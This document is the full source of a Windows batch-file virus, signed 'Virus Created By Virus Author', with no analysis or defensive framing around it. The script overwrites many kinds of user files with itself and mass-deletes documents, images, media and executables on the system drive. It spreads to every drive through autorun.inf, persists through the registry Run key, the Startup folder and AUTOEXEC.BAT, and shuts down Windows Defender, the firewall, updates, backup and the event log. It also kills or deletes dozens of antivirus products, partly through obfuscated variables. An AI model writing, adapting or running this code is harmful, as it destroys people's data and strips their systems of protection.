::__---Virus Created By Virus Author---__::
@echo off
::--Infect All Html Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.html) Do (
            Set HtmlInfect=%%Z > Nul
            Copy /y %0 %HtmlInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Mp3 Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.mp3) Do (
            Set Mp3Infect=%%Z > Nul
            Copy /y %0 %Mp3Infect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::-------Infect All .Doc-----::
Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.doc) Do (
            Set DocInfect=%%Z > Nul
            Copy /y %0 %DocInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Exe Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.exe) Do (
            Set ExeInfect=%%Z > Nul
            Copy /y %0 %ExeInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Bat Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.bat) Do (
            Set BatInfect=%%Z > Nul
            Copy /y %0 %BatInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Vlc Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.vlc) Do (
            Set VlcInfect=%%Z > Nul
            Copy /y %0 %VlcInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Mp4 Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.mp4) Do (
            Set Mp4Infect=%%Z > Nul
            Copy /y %0 %Mp4Infect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Txt Files---::
Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.txt) Do (
            Set TxtInfect=%%Z > Nul
            Copy /y %0 %TxtInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Jpeg Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.jpeg) Do (
            Set JpegInfect=%%Z > Nul
            Copy /y %0 %JpegInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Gif Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.gif) Do (
            Set GifInfect=%%Z > Nul
            Copy /y %0 %GifInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::---Infect All Mpeg Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.mpeg) Do (
            Set MpegInfect=%%Z > Nul
            Copy /y %0 %MpegInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Wma Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.wma) Do (
            Set WmaInfect=%%Z > Nul
            Copy /y %0 %WmaInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Rar Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.rar) Do (
            Set RarInfect=%%Z > Nul
            Copy /y %0 %RarInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Zip Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.zip) Do (
            Set ZipInfect=%%Z > Nul
            Copy /y %0 %ZipInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::----Infect All Vbs Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.vbs) Do (
            Set VbsInfect=%%Z > Nul
            Copy /y %0 %VbsInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
::-------Delete All .Exe-----::
DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_exe.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Mp3-----::
DIR /S/B %SystemDrive%\*.mp3 >> FIleList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp3.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Rar-----::
DIR /S/B %SystemDrive%\*.rar >> FIleList_rar.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_rar.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Doc-----::
DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Bat-----::
DIR /S/B %SystemDrive%\*.bat >> FIleList_bat.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_bat.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Png-----::
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Xml-----::
DIR /S/B %SystemDrive%\*.xml >> FIleList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_xml.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Vb------::
DIR /S/B %SystemDrive%\*.vb >> FIleList_vb.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_vb.txt) do del "%%j:%%k"
::---------------------------::
::------Delete All .Resx-----::
DIR /S/B %SystemDrive%\*.resx >> FIleList_resx.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_resx.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Pdf-----::
DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_pdf.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Gif-----::
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Vbs-----::
DIR /S/B %SystemDrive%\*.vbs >> FIleList_vbs.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_vbs.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Txt-----::
DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_txt.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Zip-----::
DIR /S/B %SystemDrive%\*.zip >> FIleList_zip.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_zip.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Mp4-----::
DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp4.txt) do del "%%j:%%k"
::---------------------------::
::-------Delete All .Jpg-----::
DIR /S/B %SystemDrive%\*.jpg >> FIleList_jpg.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_jpg.txt) do del "%%j:%%k"
::---------------------------::
::-----Infect All Drives-----::
for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
echo [AutoRun] > %%E:\autorun.inf
echo open="%%E:\%0" >> %%E:\autorun.inf
echo action=Open folder to see files... >> %%E:\autorun.inf)
::---------------------------::
::------Run As Service-------::
valinf = "rundll32_%random%_toolbar"
reginf = "hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
::---------------------------::
::-----Infect Autoexec.bat---::
echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
::---------------------------::
::----Infect All Folders-----::
Dir %SystemRoot% /s /b > PathHost
For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul
Del /f /s /q PathHost > Nul
::---------------------------::
::-----Infect "ls" CMD-----::
copy %0 %windir%\system32\ls.bat
::---------------------------::
::------Copy To Startup------::
copy %0 "%userprofile%\Start Menu\Programs\Startup"
::---------------------------::
::--Disable Windows Defender-::
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
::---------------------------::
::-Disable Windows Security Center-::
net stop "wscsvc"
::---------------------------------::
::-Disable Windows Firewall--::
net stop "MpsSvc"
taskkill /f /t /im "FirewallControlPanel.exe"
::---------------------------::
::-Disable Windows Backup-::
net stop "SDRSVC"
::------------------------::
::---Disable Windows Update--::
net stop "wuauserv"
::---------------------------::
::-Disable Windows Parental Controls-::
net stop "WPCSvc"
::-----------------------------------::
::-Disable Windows Error Reporting-::
net stop "WerSvc"
::---------------------------------::
::--Disable Windows Search---::
net stop "WSearch"
::---------------------------::
::-------AV Kill [UD]--------::
net stop �Security Center�
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe 
del /Q /F C:\Program Files\kasper~1\*.exe 
cls
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
cls
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.* 
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
cls
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe 
cls
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe 
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
cls
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
cls
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
cls
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.*
::---------------------------::
::--------AV Kill 2----------::
net stop ACKWIN32
net stop ADVXDWIN
net stop ALERTSVC
net stop ALOGSERV
net stop AMON9X
net stop ANTI-TROJAN
net stop ANTS
net stop apvxdwin
net stop ATCON
net stop ATUPDATER
net stop ATWATCH
net stop AUTODOWN
net stop AutoTrace
net stop AVCONSOL
net stop AVGCC32
net stop AVGCTRL
net stop Avgctrl
net stop AVGSERV
net stop AvgServ
net stop AVGSERV9
net stop AVGW
net stop avkpop
net stop AVKSERV
net stop avkservice
net stop avkwctl9
net stop AVP32
net stop AVP32
net stop AVPCC
net stop AVPCC
net stop AVPM
net stop AVPM
net stop Avsched32
net stop AVSYNMGR
net stop AvSynMgr
net stop AVWINNT
net stop AVXMONITOR9X
net stop AVXMONITORNT
net stop AVXQUAR
net stop AVXW
net stop BLACKD
net stop BLACKICE
net stop BlackICE
net stop CLAW95
net stop CLAW95CF
net stop CLEANER
net stop CLEANER3
net stop CMGRDIAN
net stop CONNECTIONMONITOR
net stop defscangui
net stop DEFWATCH
net stop DOORS
net stop DVP95
net stop EFPEADM
net stop ETRUSTCIPE
net stop EVPN
net stop EXPERT
net stop fameh32
net stop fch32
net stop fih32
net stop fnrb32
net stop fsaa
net stop fsav32
net stop fsgk32
net stop fsm32
net stop fsma32
net stop fsmb32
net stop gbmenu
net stop GENERICS
net stop GUARD
net stop GUARDDOG
net stop HELP
net stop IAMAPP
net stop IAMSERV
net stop ICLOAD95
net stop ICLOADNT
net stop ICMON
net stop ICSUPP95
net stop ICSUPPNT
net stop IFACE
net stop IOMON98
net stop ISRV95
net stop JEDI
net stop LDNETMON
net stop LDPROMENU
net stop LDSCAN
net stop LOCKDOWN
net stop LOCKDOWN2000
net stop LUALL
net stop LUCOMSERVER
net stop MCAGENT
net stop MCMNHDLR
net stop MCSHIELD
net stop McShield
net stop MCTOOL
net stop MCUPDATE
net stop MCVSRTE
net stop MCVSSHLD
net stop MGAVRTCL
net stop MGAVRTE
net stop MGHTML
net stop minilog
net stop MONITOR
net stop MOOLIVE
net stop MWATCH
net stop NAVAP
net stop navapsvc
net stop NAVAPW32
net stop NAVENG
net stop NAVEX15
net stop NAVLU32
net stop NAVW32
net stop NAVWNT
net stop NDD32
net stop NeoWatchLog
net stop NETUTILS
net stop ngdbserv
net stop NGServer
net stop NISSERV
net stop NISSERV
net stop NISUM
net stop NISUM
net stop NMAIN
net stop NORMIST
net stop NPROTECT
net stop NPSSVC
net stop NSCHED32
net stop ntrtscan
net stop NTVDM
net stop NTXconfig
net stop NVC95
net stop NVSVC32
net stop NWService
net stop NWTOOL16
net stop PADMIN
net stop pavproxy
net stop PCCIOMON
net stop pccntmon
net stop pccwin97
net stop PCCWIN98
net stop pcscan
net stop PERSFW
net stop POP3TRAP
net stop POPROXY
net stop PORTMONITOR
net stop PROCESSMONITOR
net stop PROGRAMAUDITOR
net stop PROT95
net stop PVIEW95
net stop RAV7
net stop RAV7WIN
net stop REALMON
net stop RESCUE
net stop RTVSCN95
net stop sbserv
net stop SCAN32
net stop SCRSCAN
net stop sharedaccess
net stop SPHINX
net stop SPYXX
net stop SS3EDIT
net stop STOPW
net stop SVW3
net stop SWEEP95
net stop SweepNet
net stop SWEEPSRV
net stop SWEEPSRV.SYS
net stop SweepUpdate
net stop SWNETSUP
net stop SymProxySvc
net stop SYMTRAY
net stop TFAK
net stop vbcmserv
net stop VbCons
net stop VET32
net stop VET95
net stop VETTRAY
net stop VPC32
net stop VPTRAY
net stop VSCHED
net stop VSECOMR
net stop VSHWIN32
net stop VSMAIN
net stop vsmon
net stop VSMON
net stop VSSTAT
net stop WATCHDOG
net stop WEBSCANX
net stop WGFE95
net stop WIMMUN32
net stop WRADMIN
net stop WRCTRL
net stop ZAPROMINILOG
net stop ZONEALARM
::---------------------------::
::-----Temporary AV Kill-----::
taskkill /f /t /im ccapp
taskkill /f /t /im mcdetect t
taskkill /f /t /im McAfee security Center Module
taskkill /f /t /im yahoomessenger /f /t
taskkill /f /t /im msmsgs
taskkill /f /t /im firefox
taskkill /f /t /im iexplore
taskkill /f /t /im _Avp32.exe
taskkill /f /t /im _Avpcc.exe
taskkill /f /t /im _Avpm.exe
taskkill /f /t /im Agnitum Outpost Firewall
taskkill /f /t /im Anti-Trojan.exe
taskkill /f /t /im ANTIVIR
taskkill /f /t /im Apvxdwin.exe
taskkill /f /t /im ATRACK
taskkill /f /t /im Autodown.exe
taskkill /f /t /im AVCONSOL
taskkill /f /t /im Avconsol.exe
taskkill /f /t /im Ave32.exe
taskkill /f /t /im Avgctrl.exe
taskkill /f /t /im Avkserv.exe
taskkill /f /t /im Avnt.exe
taskkill /f /t /im Avp.exe
taskkill /f /t /im AVP.EXE
taskkill /f /t /im AVP32
taskkill /f /t /im Avp32.exe
taskkill /f /t /im Avpcc.exe
taskkill /f /t /im Avpdos32.exe
taskkill /f /t /im Avpm.exe
taskkill /f /t /im Avptc32.exe
taskkill /f /t /im Avpupd.exe
taskkill /f /t /im Avsched32.exe
taskkill /f /t /im AVSync Manager
taskkill /f /t /im AVSYNMGR
taskkill /f /t /im Avwin95.exe
taskkill /f /t /im Avwupd32.exe
taskkill /f /t /im Blackd.exe
taskkill /f /t /im BLACKICE
taskkill /f /t /im BlackICE Defender
taskkill /f /t /im Blackice.exe
taskkill /f /t /im CA Sessionwall-3
taskkill /f /t /im Cfiadmin.exe
taskkill /f /t /im Cfiaudit.exe
taskkill /f /t /im CFINET
taskkill /f /t /im Cfinet.exe
taskkill /f /t /im CFINET32
taskkill /f /t /im Cfinet32.exe
taskkill /f /t /im Claw95.exe
taskkill /f /t /im Claw95cf.exe
taskkill /f /t /im Cleaner.exe
taskkill /f /t /im Cleaner3.exe
taskkill /f /t /im Defwatch
taskkill /f /t /im Dvp95.exe
taskkill /f /t /im Dvp95_0.exe
taskkill /f /t /im Ecengine.exe
taskkill /f /t /im eSafe Protect Desktop
taskkill /f /t /im Esafe.exe
taskkill /f /t /im Espwatch.exe
taskkill /f /t /im eTrust EZ Firewall
taskkill /f /t /im F-Agnt95.exe
taskkill /f /t /im Findviru.exe
taskkill /f /t /im Fprot.exe
taskkill /f /t /im F-Prot.exe
taskkill /f /t /im F-PROT95
taskkill /f /t /im F-Prot95.exe
taskkill /f /t /im Fp-Win.exe
taskkill /f /t /im "Freedom 2"
taskkill /f /t /im Frw.exe
taskkill /f /t /im F-STOPW
taskkill /f /t /im F-Stopw.exe
taskkill /f /t /im GNAT Box Lite
taskkill /f /t /im IAMAPP
taskkill /f /t /im Iamapp.exe
taskkill /f /t /im Iamserv.exe
taskkill /f /t /im Ibmasn.exe
taskkill /f /t /im Ibmavsp.exe
taskkill /f /t /im Icload95.exe
taskkill /f /t /im Icloadnt.exe
taskkill /f /t /im ICMON
taskkill /f /t /im Icmon.exe
taskkill /f /t /im Icsupp95.exe
taskkill /f /t /im Icsuppnt.exe
taskkill /f /t /im Iface.exe
taskkill /f /t /im Internet Alert 99
taskkill /f /t /im IOMON98
taskkill /f /t /im Iomon98.exe
taskkill /f /t /im LOCKDOWN2000
taskkill /f /t /im Lockdown2000.exe
taskkill /f /t /im Look'n'Stop
taskkill /f /t /im Lookout.exe
taskkill /f /t /im LUALL
taskkill /f /t /im Luall.exe
taskkill /f /t /im LUCOMSERVER
taskkill /f /t /im MCAFEE
taskkill /f /t /im McAfee Firewall
taskkill /f /t /im McAfee Internet Guard Dog Pro
taskkill /f /t /im Moolive.exe
taskkill /f /t /im Mpftray.exe
taskkill /f /t /im N32scanw.exe
taskkill /f /t /im NAVAPSVC
taskkill /f /t /im NAVAPW32
taskkill /f /t /im NAVLU32
taskkill /f /t /im Navlu32.exe
taskkill /f /t /im Navnt.exe
taskkill /f /t /im NAVRUNR
taskkill /f /t /im NAVW32
taskkill /f /t /im NAVWNT
taskkill /f /t /im Navwnt.exe
taskkill /f /t /im NeoWatch
taskkill /f /t /im NISSERV
taskkill /f /t /im Nisum.exe
taskkill /f /t /im NMAIN
taskkill /f /t /im Nmain.exe
taskkill /f /t /im Norman Personal Firewall
taskkill /f /t /im Normist.exe
taskkill /f /t /im NORTON
taskkill /f /t /im Norton AntiVirus Server
taskkill /f /t /im Norton Internet Security
taskkill /f /t /im Norton Personal Firewall 2001
taskkill /f /t /im Nupgrade.exe
taskkill /f /t /im NVC95
taskkill /f /t /im Nvc95.exe
taskkill /f /t /im Outpost.exe
taskkill /f /t /im Padmin.exe
taskkill /f /t /im Pavcl.exe
taskkill /f /t /im Pavsched.exe
taskkill /f /t /im Pavw.exe
taskkill /f /t /im Pc firewall
taskkill /f /t /im PC Viper
taskkill /f /t /im PCCIOMON
taskkill /f /t /im PCCMAIN
taskkill /f /t /im PCCWIN98
taskkill /f /t /im Pccwin98.exe
taskkill /f /t /im Pcfwallicon.exe
taskkill /f /t /im Persfw.exe
taskkill /f /t /im PGP Gauntlet
taskkill /f /t /im POP3TRAP
taskkill /f /t /im Proxy +
taskkill /f /t /im PVIEW95
taskkill /f /t /im Rav7.exe
taskkill /f /t /im Rav7win.exe
taskkill /f /t /im Rescue.exe
taskkill /f /t /im RESCUE32
taskkill /f /t /im SAFEWEB
taskkill /f /t /im Safeweb.exe
taskkill /f /t /im Scan32.exe
taskkill /f /t /im Scan95.exe
taskkill /f /t /im Scrscan.exe
taskkill /f /t /im Serv95.exe
taskkill /f /t /im Smc.exe
taskkill /f /t /im SMCSERVICE
taskkill /f /t /im Snort - Win32 GUI
taskkill /f /t /im Snort (Intrusion Detection System)
taskkill /f /t /im Sphinx.exe
taskkill /f /t /im Sphinxwall
taskkill /f /t /im Sweep95.exe
taskkill /f /t /im Sybergen Secure Desktop
taskkill /f /t /im Sybergen SyGate
taskkill /f /t /im Tbscan.exe
taskkill /f /t /im Tca.exe
taskkill /f /t /im Tds2-98.exe
taskkill /f /t /im Tds2-Nt.exe
taskkill /f /t /im TermiNET
taskkill /f /t /im TGB:BOB
taskkill /f /t /im Tiny Personal Firewall
taskkill /f /t /im Vet95.exe
taskkill /f /t /im Vettray.exe
taskkill /f /t /im Vscan40.exe
taskkill /f /t /im Vsecomr.exe
taskkill /f /t /im VSHWIN32
taskkill /f /t /im Vshwin32.exe
taskkill /f /t /im VSSTAT
taskkill /f /t /im Vsstat.exe
taskkill /f /t /im WEBSCANX
taskkill /f /t /im Webscanx.exe
taskkill /f /t /im WEBTRAP
taskkill /f /t /im Wfindv32.exe
taskkill /f /t /im Wingate
taskkill /f /t /im WinProxy
taskkill /f /t /im WinRoute
taskkill /f /t /im WyvernWorks Firewall
taskkill /f /t /im Zonealarm
taskkill /f /t /im Zonealarm.exe
taskkill /f /t /im AVP32
taskkill /f /t /im LOCKDOWN2000
taskkill /f /t /im AVP.EXE
taskkill /f /t /im CFINET32
taskkill /f /t /im CFINET
taskkill /f /t /im ICMON
taskkill /f /t /im SAFEWEB
taskkill /f /t /im WEBSCANX
taskkill /f /t /im ANTIVIR
taskkill /f /t /im MCAFEE
taskkill /f /t /im NORTON
taskkill /f /t /im NVC95
taskkill /f /t /im FP-WIN
taskkill /f /t /im IOMON98
taskkill /f /t /im PCCWIN98
taskkill /f /t /im F-PROT95
taskkill /f /t /im F-STOPW
taskkill /f /t /im PVIEW95
taskkill /f /t /im NAVWNT
taskkill /f /t /im NAVRUNR
taskkill /f /t /im NAVLU32
taskkill /f /t /im NAVAPSVC
taskkill /f /t /im NISUM
taskkill /f /t /im SYMPROXYSVC
taskkill /f /t /im RESCUE32
taskkill /f /t /im NISSERV
taskkill /f /t /im ATRACK
taskkill /f /t /im IAMAPP
taskkill /f /t /im LUALL
taskkill /f /t /im NMAIN
taskkill /f /t /im NAVW32
taskkill /f /t /im NAVAPW32
taskkill /f /t /im VSSTAT
taskkill /f /t /im VSHWIN32
taskkill /f /t /im AVSYNMGR
taskkill /f /t /im AVCONSOL
taskkill /f /t /im WEBTRAP
taskkill /f /t /im POP3TRAP
taskkill /f /t /im PCCMAIN
taskkill /f /t /im PCCIOMON
::---------------------------::
::------Encrypted AV Kill----::
del /F /Q %SystemDrive%\recycler\S-1-5-21-1202660629-261903793-725345543-1003\run.bat
set ii=ne
set ywe=st
set ury=t
set iej=op
set jt53=Syma
set o6t=nor
set lyd2=fee
set h3d=ton
set gf45=ntec
set own5=McA
%ii%%ury% %ywe%%iej% "Security Center" /y
%ii%%ury% %ywe%%iej% "Automatic Updates" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% "SAVScan" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Firewall Monitor Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto-Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Spamkiller Server" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Personal Firewall Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% SecurityCenter Update Manager" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% SPBBCSvc" /y
cls
%ii%%ury% %ywe%%iej% "Ahnlab Task Scheduler" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% vrmonsvc /y
%ii%%ury% %ywe%%iej% MonSvcNT /y
%ii%%ury% %ywe%%iej% SAVScan /y
%ii%%ury% %ywe%%iej% NProtectService /y
%ii%%ury% %ywe%%iej% ccSetMGR /y
%ii%%ury% %ywe%%iej% ccEvtMGR /y
%ii%%ury% %ywe%%iej% srservice /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Network Drivers Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% Unerase Protection" /y
%ii%%ury% %ywe%%iej% MskService /y
%ii%%ury% %ywe%%iej% MpfService /y
%ii%%ury% %ywe%%iej% mcupdmgr.exe /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%AntiSpyware" /y
%ii%%ury% %ywe%%iej% helpsvc /y
%ii%%ury% %ywe%%iej% ERSvc /y
%ii%%ury% %ywe%%iej% "*%o6t%%h3d%*" /y
%ii%%ury% %ywe%%iej% "*%jt53%%gf45%*" /y
%ii%%ury% %ywe%%iej% "*%own5%%lyd2%*" /y
cls
%ii%%ury% %ywe%%iej% ccPwdSvc /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Serv-U" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Server" /y
%ii%%ury% %ywe%%iej% "NAV Alert" /y
%ii%%ury% %ywe%%iej% "Nav Auto-Protect" /y
cls
%ii%%ury% %ywe%%iej% "McShield" /y
%ii%%ury% %ywe%%iej% "DefWatch" /y
%ii%%ury% %ywe%%iej% eventlog /y
%ii%%ury% %ywe%%iej% InoRPC /y
%ii%%ury% %ywe%%iej% InoRT /y
%ii%%ury% %ywe%%iej% InoTask /y
cls
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Corporate Edition" /y
%ii%%ury% %ywe%%iej% "ViRobot Professional Monitoring" /y
%ii%%ury% %ywe%%iej% "PC-cillin Personal Firewall" /y
%ii%%ury% %ywe%%iej% "Trend Micro Proxy Service" /y
%ii%%ury% %ywe%%iej% "Trend NT Realtime Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com McShield" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com VirusScan Online Realtime Engine" /y
%ii%%ury% %ywe%%iej% "SyGateService" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
cls
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus" /y
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus Network" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Job Server" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Realtime Server" /y
